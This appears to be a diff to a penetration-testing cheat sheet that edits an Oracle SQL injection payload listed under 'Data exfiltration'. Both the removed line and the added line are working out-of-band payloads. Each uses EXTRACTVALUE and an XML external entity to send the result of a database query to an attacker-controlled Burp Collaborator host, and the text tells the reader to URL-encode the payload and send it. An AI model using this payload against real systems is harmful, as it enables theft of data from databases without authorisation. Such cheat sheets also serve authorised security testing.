@@ -25,7 +25,7 @@ Control + U for URL Encoding and SEND
 
 ### Data exfiltration
 ```sql
-'UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(select QUERY HERE')||'.x.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
+'SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual--
 ```
 Control + U for URL Encoding and SEND
 
